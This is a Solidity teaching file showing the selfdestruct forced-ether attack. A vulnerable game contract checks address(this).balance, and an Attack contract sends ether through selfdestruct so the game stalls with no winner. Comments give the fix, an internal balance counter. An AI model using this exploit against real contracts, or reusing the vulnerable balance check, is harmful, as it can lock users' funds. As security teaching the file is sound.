/*
    Deploy a contract that simulate a game, each player can send exactly 1 ether
    who send the 5th is winner, Winner get to withdraw all money

    Attack using selfdestruct function, which is a function can
        - delete contract
        - selfdestruct(addr) => send all contract balance to address (no need fallback function)
        -> this function use less gas, useful for clean up
    => make it so that no one can be winner (balance > 5)

    To prevent: don't rely on address(this).balance, mark that fix in comment with *
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract TheGame {
    uint public target = 5 ether;
    //uint public bal; // * Use this instead of address(this).balance
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "Can only send exactly 1 ether!");

        uint bal = address(this).balance;
        //bal += msg.value; // * Fix update
        require(bal <= target, "Game is over!");

        if (bal == target) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner!");

        //(bool sent, ) = msg.sender.call{value: bal}(""); // * Send using bal
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Transaction failed");
    }

    function checkBalance() view public returns (uint) {
        return address(this).balance;
    }

    function testCall() view public returns (uint) {
        return 123;
    }
}

contract Attack {
    TheGame theGame;

    constructor(address _theGame) {
        theGame = TheGame(_theGame);
    }

    function attack() public payable {
        /*
            Send ethers so that total ether in contract > 5
            => we send through selfdestruct(), not deposit() so can send > 1 ether

            If the contract owner don't rely on address(this).balance, then
            attacker lose the ether for nothing, the game is still working correctly
        */
        address payable addr = payable(address(theGame));
        selfdestruct(addr);
    }
}